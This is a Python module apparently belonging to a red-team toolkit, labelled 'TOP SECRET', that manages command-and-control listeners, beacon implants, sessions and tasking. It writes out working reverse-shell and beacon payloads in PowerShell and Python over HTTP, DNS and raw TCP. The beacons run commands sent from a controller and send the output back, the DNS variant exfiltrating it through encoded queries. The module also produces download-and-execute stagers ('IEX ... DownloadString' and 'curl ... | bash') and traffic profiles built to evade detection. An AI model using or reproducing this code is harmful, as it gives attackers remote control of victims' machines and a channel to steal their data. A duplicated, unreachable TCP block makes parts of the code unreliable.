"""
ORDL RED TEAM - C2 INFRASTRUCTURE
Classification: TOP SECRET//SCI//NOFORN

Command & Control infrastructure management:
- Listener management (HTTP, HTTPS, DNS, TCP)
- Beacon configuration
- Payload staging
- Session management
- Kill switches
- Traffic shaping and evasion
"""

import socket
import threading
import logging
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import json
import base64
import random
import string

logger = logging.getLogger(__name__)


class ListenerType(Enum):
    """Types of C2 listeners"""
    HTTP = "http"
    HTTPS = "https"
    TCP = "tcp"
    UDP = "udp"
    DNS = "dns"
    SMB = "smb"
    ICMP = "icmp"


class BeaconType(Enum):
    """Types of beacons"""
    HTTP_BEACON = "http_beacon"
    DNS_BEACON = "dns_beacon"
    TCP_BEACON = "tcp_beacon"
    SMB_BEACON = "smb_beacon"


class SessionStatus(Enum):
    """Session status states"""
    ACTIVE = "active"
    IDLE = "idle"
    LOST = "lost"
    DEAD = "dead"


@dataclass
class C2Listener:
    """C2 listener configuration"""
    listener_id: str
    name: str
    listener_type: ListenerType
    bind_host: str
    bind_port: int
    status: str = "stopped"  # running, stopped, error
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    started_at: Optional[str] = None
    profile: str = "default"  # Traffic profile (default, low_slow, aggressive)
    ssl_cert: str = ""  # Path to SSL certificate
    ssl_key: str = ""   # Path to SSL key
    domain: str = ""    # For DNS/HTTPS listeners
    uri_path: str = "/update"  # URI path for HTTP beaconing
    user_agent: str = "Mozilla/5.0"
    jitter: int = 20  # Random delay percentage
    beacon_interval: int = 60  # Seconds between beacons


@dataclass
class Beacon:
    """Beacon implant configuration"""
    beacon_id: str
    name: str
    beacon_type: BeaconType
    listener_id: str
    target_platform: str  # windows, linux, macos
    architecture: str  # x86, x64, arm
    payload: bytes = b""
    configuration: Dict = field(default_factory=dict)
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())


@dataclass
class C2Session:
    """Active C2 session"""
    session_id: str
    listener_id: str
    beacon_id: str
    external_ip: str
    internal_ip: str
    hostname: str
    username: str
    operating_system: str
    architecture: str
    process_id: int
    process_name: str
    integrity_level: str  # low, medium, high, system
    status: SessionStatus
    first_seen: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    last_seen: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    task_queue: List[Dict] = field(default_factory=list)
    task_history: List[Dict] = field(default_factory=list)


@dataclass
class C2Task:
    """Task to execute on beacon"""
    task_id: str
    session_id: str
    command: str
    arguments: List[str] = field(default_factory=list)
    status: str = "pending"  # pending, running, complete, failed
    output: str = ""
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    started_at: Optional[str] = None
    completed_at: Optional[str] = None


class C2Infrastructure:
    """
    Command & Control infrastructure manager.
    Handles listeners, beacons, and active sessions.
    """
    
    def __init__(self, redteam_manager=None):
        self.rt_manager = redteam_manager
        self.listeners: Dict[str, C2Listener] = {}
        self.beacons: Dict[str, Beacon] = {}
        self.sessions: Dict[str, C2Session] = {}
        self.tasks: Dict[str, C2Task] = {}
        
        self.listener_counter = 0
        self.session_counter = 0
        self.task_counter = 0
        
        # Traffic profiles for evasion
        self.profiles = {
            "default": {
                "jitter": 20,
                "beacon_interval": 60,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            "low_slow": {
                "jitter": 50,
                "beacon_interval": 3600,  # 1 hour
                "user_agent": "Microsoft-Delivery-Optimization/10.0"
            },
            "aggressive": {
                "jitter": 10,
                "beacon_interval": 10,
                "user_agent": "Mozilla/5.0"
            }
        }
        
    def create_listener(self, name: str, listener_type: ListenerType,
                       bind_host: str, bind_port: int,
                       profile: str = "default",
                       ssl_cert: str = "", ssl_key: str = "",
                       domain: str = "") -> C2Listener:
        """
        Create a new C2 listener.
        
        Args:
            name: Listener name
            listener_type: HTTP, HTTPS, TCP, etc.
            bind_host: Bind address
            bind_port: Port to listen on
            profile: Traffic profile (default, low_slow, aggressive)
            ssl_cert: SSL certificate path (for HTTPS)
            ssl_key: SSL key path (for HTTPS)
            domain: Domain name (for DNS/HTTPS)
        
        Returns:
            C2Listener object
        """
        self.listener_counter += 1
        listener_id = f"LISTENER-{self.listener_counter:04d}"
        
        profile_config = self.profiles.get(profile, self.profiles["default"])
        
        listener = C2Listener(
            listener_id=listener_id,
            name=name,
            listener_type=listener_type,
            bind_host=bind_host,
            bind_port=bind_port,
            profile=profile,
            ssl_cert=ssl_cert,
            ssl_key=ssl_key,
            domain=domain,
            jitter=profile_config["jitter"],
            beacon_interval=profile_config["beacon_interval"],
            user_agent=profile_config["user_agent"]
        )
        
        self.listeners[listener_id] = listener
        
        logger.info(f"[C2] Listener created: {listener_id} ({listener_type.value}://{bind_host}:{bind_port})")
        
        # Audit log
        if self.rt_manager and self.rt_manager.audit_logger:
            self.rt_manager.audit_logger.log(
                event_type="C2_LISTENER_CREATED",
                user_codename="system",
                resource_id=listener_id,
                action="CREATE",
                status="SUCCESS",
                details={
                    "type": listener_type.value,
                    "bind": f"{bind_host}:{bind_port}",
                    "profile": profile
                }
            )
        
        return listener
    
    def start_listener(self, listener_id: str) -> bool:
        """Start a C2 listener"""
        listener = self.listeners.get(listener_id)
        if not listener:
            return False
        
        # In real implementation, this would start the actual server
        listener.status = "running"
        listener.started_at = datetime.utcnow().isoformat()
        
        logger.info(f"[C2] Listener started: {listener_id}")
        return True
    
    def stop_listener(self, listener_id: str) -> bool:
        """Stop a C2 listener"""
        listener = self.listeners.get(listener_id)
        if not listener:
            return False
        
        listener.status = "stopped"
        logger.info(f"[C2] Listener stopped: {listener_id}")
        return True
    
    def delete_listener(self, listener_id: str) -> bool:
        """Delete a C2 listener"""
        if listener_id in self.listeners:
            self.stop_listener(listener_id)
            del self.listeners[listener_id]
            logger.info(f"[C2] Listener deleted: {listener_id}")
            return True
        return False
    
    def get_listener(self, listener_id: str) -> Optional[C2Listener]:
        """Get listener by ID"""
        return self.listeners.get(listener_id)
    
    def list_listeners(self, status: str = None) -> List[C2Listener]:
        """List all listeners, optionally filtered by status"""
        listeners = list(self.listeners.values())
        if status:
            listeners = [l for l in listeners if l.status == status]
        return listeners
    
    def generate_beacon(self, name: str, beacon_type: BeaconType,
                       listener_id: str,
                       target_platform: str = "windows",
                       architecture: str = "x64") -> Optional[Beacon]:
        """
        Generate a beacon implant.
        
        Args:
            name: Beacon name
            beacon_type: Type of beacon
            listener_id: Listener to connect to
            target_platform: Target OS
            architecture: Target architecture
        
        Returns:
            Beacon object or None
        """
        listener = self.listeners.get(listener_id)
        if not listener:
            logger.error(f"[C2] Listener not found: {listener_id}")
            return None
        
        beacon_id = f"BEACON-{len(self.beacons)+1:04d}"
        
        # Generate beacon payload based on type
        payload = self._generate_beacon_payload(
            beacon_type, listener, target_platform, architecture
        )
        
        beacon = Beacon(
            beacon_id=beacon_id,
            name=name,
            beacon_type=beacon_type,
            listener_id=listener_id,
            target_platform=target_platform,
            architecture=architecture,
            payload=payload,
            configuration={
                "callback_host": listener.domain or listener.bind_host,
                "callback_port": listener.bind_port,
                "uri_path": listener.uri_path,
                "user_agent": listener.user_agent,
                "jitter": listener.jitter,
                "beacon_interval": listener.beacon_interval
            }
        )
        
        self.beacons[beacon_id] = beacon
        logger.info(f"[C2] Beacon generated: {beacon_id} ({beacon_type.value})")
        
        return beacon
    
    def _generate_beacon_payload(self, beacon_type: BeaconType,
                                 listener: C2Listener,
                                 platform: str, arch: str) -> bytes:
        """Generate beacon payload code"""
        
        callback_host = listener.domain or listener.bind_host
        callback_port = listener.bind_port
        
        if beacon_type == BeaconType.HTTP_BEACON:
            if platform == "windows":
                # PowerShell HTTP beacon
                code_template = '''
$c = "{host}:{port}";
$u = "{uri}";
$ua = "{ua}";
while($true){{
    try{{
        $r = Invoke-WebRequest -Uri "http://$c$u" -UserAgent $ua -UseBasicParsing;
        if($r.Content){{
            $cmd = $r.Content;
            $o = Invoke-Expression $cmd 2>&1 | Out-String;
            Invoke-WebRequest -Uri "http://$c$u/r" -Method POST -Body $o -UserAgent $ua;
        }}
    }}catch{{}}
    Start-Sleep -Seconds {interval}
}}
'''
                code = code_template.format(
                    host=callback_host,
                    port=callback_port,
                    uri=listener.uri_path,
                    ua=listener.user_agent,
                    interval=listener.beacon_interval
                )
                return code.encode()
            
            else:  # Linux/Mac
                # Python HTTP beacon
                code = '''import urllib.request,urllib.parse,subprocess,time
while True:
    try:
        req=urllib.request.Request('http://{host}:{port}{uri}',headers={{'User-Agent':'{ua}'}})
        r=urllib.request.urlopen(req)
        cmd=r.read().decode()
        if cmd:
            out=subprocess.getoutput(cmd)
            data=urllib.parse.urlencode({{'r':out}}).encode()
            urllib.request.urlopen(urllib.request.Request('http://{host}:{port}{uri}/r',data=data,headers={{'User-Agent':'{ua}'}}))
    except:pass
    time.sleep({interval})
'''.format(
    host=callback_host,
    port=callback_port,
    uri=listener.uri_path,
    ua=listener.user_agent,
    interval=listener.beacon_interval
)
                return code.encode()
        
        elif beacon_type == BeaconType.DNS_BEACON:
            # DNS beacon using DNS queries for C2
            if platform == "windows":
                code_template = '''
$ns = "{host}";
while($true){{
    try{{
        $d = (Resolve-DnsName -Name "c2.$ns" -Type TXT).Strings;
        if($d){{
            $o = Invoke-Expression $d 2>&1 | Out-String;
            $e = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($o));
            foreach($s in ($e -split '(.{{{{50}}}})')){{ if($s){{ Resolve-DnsName -Name "$s.r.$ns" -Type A | Out-Null }} }}
        }}
    }}catch{{}}
    Start-Sleep -Seconds {interval}
}}
'''
                code = code_template.format(
                    host=callback_host,
                    interval=listener.beacon_interval
                )
                return code.encode()
            else:
                code = '''import dns.resolver,subprocess,base64,time
while True:
    try:
        ans=dns.resolver.resolve('c2.{host}','TXT')
        for r in ans:
            cmd=r.to_text().strip('"')
            if cmd:
                out=subprocess.getoutput(cmd)
                enc=base64.b64encode(out.encode()).decode()
                for i in range(0,len(enc),50):dns.resolver.resolve(enc[i:i+50]+'.r.{host}','A')
    except:pass
    time.sleep({interval})
'''.format(
    host=callback_host,
    interval=listener.beacon_interval
)
                return code.encode()
        
        elif beacon_type == BeaconType.TCP_BEACON:
            # Raw TCP beacon
            if platform == "windows":
                code_template = '''
while($true){{
    try{{
        $c = New-Object System.Net.Sockets.TCPClient("{host}",{port});
        $s = $c.GetStream();
        $b = New-Object byte[] 65535;
        while(($r = $s.Read($b,0,$b.Length)) -ne 0){{
            $cmd = (New-Object Text.ASCIIEncoding).GetString($b,0,$r);
            $o = (Invoke-Expression $cmd 2>&1 | Out-String);
            $w = (New-Object Text.ASCIIEncoding).GetBytes($o);
            $s.Write($w,0,$w.Length);
        }}
    }}catch{{}}
    Start-Sleep -Seconds {interval}
}}
'''
                code = code_template.format(
                    host=callback_host,
                    port=callback_port,
                    interval=listener.beacon_interval
                )
                return code.encode()
            else:
                code = '''import socket,subprocess,time
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{host}",{port}))
        while True:
            d=s.recv(65535)
            if not d:break
            o=subprocess.getoutput(d.decode())
            s.send(o.encode())
    except:pass
    time.sleep({interval})
'''.format(
    host=callback_host,
    port=callback_port,
    interval=listener.beacon_interval
)
                return code.encode()
            # Raw TCP beacon
            if platform == "windows":
                code = f'''
while($true){{
    try{{
        $c = New-Object System.Net.Sockets.TCPClient("{callback_host}",{callback_port});
        $s = $c.GetStream();
        $b = New-Object byte[] 65535;
        while(($r = $s.Read($b,0,$b.Length)) -ne 0){{
            $cmd = (New-Object Text.ASCIIEncoding).GetString($b,0,$r);
            $o = (Invoke-Expression $cmd 2>&1 | Out-String);
            $w = (New-Object Text.ASCIIEncoding).GetBytes($o);
            $s.Write($w,0,$w.Length);
        }}
    }}catch{{}}
    Start-Sleep -Seconds {listener.beacon_interval}
}}
'''
                return code.encode()
            else:
                code = f'''
import socket,subprocess,time
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{callback_host}",{callback_port}))
        while True:
            d=s.recv(65535)
            if not d:break
            o=subprocess.getoutput(d.decode())
            s.send(o.encode())
    except:pass
    time.sleep({listener.beacon_interval})
'''
                return code.encode()
        
        return b""
    
    def register_session(self, listener_id: str, beacon_id: str,
                        external_ip: str, internal_ip: str,
                        hostname: str, username: str,
                        operating_system: str, architecture: str,
                        process_id: int, process_name: str,
                        integrity_level: str) -> C2Session:
        """
        Register a new C2 session from a beacon.
        
        Returns:
            C2Session object
        """
        self.session_counter += 1
        session_id = f"SESSION-{self.session_counter:04d}"
        
        session = C2Session(
            session_id=session_id,
            listener_id=listener_id,
            beacon_id=beacon_id,
            external_ip=external_ip,
            internal_ip=internal_ip,
            hostname=hostname,
            username=username,
            operating_system=operating_system,
            architecture=architecture,
            process_id=process_id,
            process_name=process_name,
            integrity_level=integrity_level,
            status=SessionStatus.ACTIVE
        )
        
        self.sessions[session_id] = session
        
        logger.info(f"[C2] Session registered: {session_id} ({hostname} / {username})")
        
        # Audit log
        if self.rt_manager and self.rt_manager.audit_logger:
            self.rt_manager.audit_logger.log(
                event_type="C2_SESSION_REGISTERED",
                user_codename="system",
                resource_id=session_id,
                action="REGISTER",
                status="SUCCESS",
                details={
                    "hostname": hostname,
                    "username": username,
                    "os": operating_system,
                    "integrity": integrity_level
                }
            )
        
        return session
    
    def get_session(self, session_id: str) -> Optional[C2Session]:
        """Get session by ID"""
        return self.sessions.get(session_id)
    
    def list_sessions(self, status: SessionStatus = None) -> List[C2Session]:
        """List sessions, optionally filtered by status"""
        sessions = list(self.sessions.values())
        if status:
            sessions = [s for s in sessions if s.status == status]
        return sessions
    
    def update_session_activity(self, session_id: str):
        """Update last seen timestamp for a session"""
        session = self.sessions.get(session_id)
        if session:
            session.last_seen = datetime.utcnow().isoformat()
    
    def kill_session(self, session_id: str) -> bool:
        """Kill a C2 session"""
        session = self.sessions.get(session_id)
        if not session:
            return False
        
        session.status = SessionStatus.DEAD
        logger.info(f"[C2] Session killed: {session_id}")
        return True
    
    def queue_task(self, session_id: str, command: str,
                   arguments: List[str] = None) -> Optional[C2Task]:
        """
        Queue a task for execution on a session.
        
        Args:
            session_id: Target session
            command: Command to execute
            arguments: Command arguments
        
        Returns:
            C2Task object
        """
        session = self.sessions.get(session_id)
        if not session:
            return None
        
        self.task_counter += 1
        task_id = f"TASK-{self.task_counter:04d}"
        
        task = C2Task(
            task_id=task_id,
            session_id=session_id,
            command=command,
            arguments=arguments or []
        )
        
        self.tasks[task_id] = task
        session.task_queue.append(task.to_dict() if hasattr(task, 'to_dict') else {
            "task_id": task_id,
            "command": command,
            "arguments": arguments
        })
        
        logger.info(f"[C2] Task queued: {task_id} for {session_id}")
        return task
    
    def get_task_result(self, task_id: str) -> Optional[C2Task]:
        """Get task result by ID"""
        return self.tasks.get(task_id)
    
    def get_pending_tasks(self, session_id: str) -> List[Dict]:
        """Get pending tasks for a session"""
        session = self.sessions.get(session_id)
        if not session:
            return []
        return session.task_queue
    
    def complete_task(self, task_id: str, output: str,
                     success: bool = True) -> bool:
        """Mark a task as complete"""
        task = self.tasks.get(task_id)
        if not task:
            return False
        
        task.status = "complete" if success else "failed"
        task.output = output
        task.completed_at = datetime.utcnow().isoformat()
        
        # Move from queue to history
        session = self.sessions.get(task.session_id)
        if session:
            session.task_queue = [t for t in session.task_queue 
                                 if t.get("task_id") != task_id]
            session.task_history.append({
                "task_id": task_id,
                "command": task.command,
                "status": task.status,
                "timestamp": task.completed_at
            })
        
        return True
    
    def generate_stager(self, listener_id: str, 
                       platform: str = "windows") -> str:
        """
        Generate a one-line stager for initial access.
        
        Args:
            listener_id: C2 listener ID
            platform: Target platform
        
        Returns:
            One-line stager command
        """
        listener = self.listeners.get(listener_id)
        if not listener:
            return ""
        
        host = listener.domain or listener.bind_host
        port = listener.bind_port
        
        if platform == "windows":
            # PowerShell stager
            ps = f"IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/s')"
            return f"powershell -nop -c \"{ps}\""
        
        elif platform == "linux":
            # Bash stager
            return f"curl -s http://{host}:{port}/s | bash"
        
        elif platform == "macos":
            # macOS stager
            return f"curl -s http://{host}:{port}/s | bash"
        
        return ""
    
    def kill_all_sessions(self) -> int:
        """
        Kill switch - terminate all sessions.
        
        Returns:
            Number of sessions killed
        """
        count = 0
        for session in self.sessions.values():
            if session.status == SessionStatus.ACTIVE:
                session.status = SessionStatus.DEAD
                count += 1
        
        logger.warning(f"[C2] KILL SWITCH ACTIVATED - {count} sessions terminated")
        return count
    
    def get_statistics(self) -> Dict:
        """Get C2 infrastructure statistics"""
        active_listeners = len([l for l in self.listeners.values() if l.status == "running"])
        active_sessions = len([s for s in self.sessions.values() if s.status == SessionStatus.ACTIVE])
        pending_tasks = sum(len(s.task_queue) for s in self.sessions.values())
        
        return {
            "total_listeners": len(self.listeners),
            "active_listeners": active_listeners,
            "total_beacons": len(self.beacons),
            "total_sessions": len(self.sessions),
            "active_sessions": active_sessions,
            "dead_sessions": len([s for s in self.sessions.values() if s.status == SessionStatus.DEAD]),
            "pending_tasks": pending_tasks,
            "completed_tasks": len([t for t in self.tasks.values() if t.status == "complete"])
        }


__all__ = [
    'C2Infrastructure',
    'C2Listener',
    'Beacon',
    'C2Session',
    'C2Task',
    'ListenerType',
    'BeaconType',
    'SessionStatus'
]
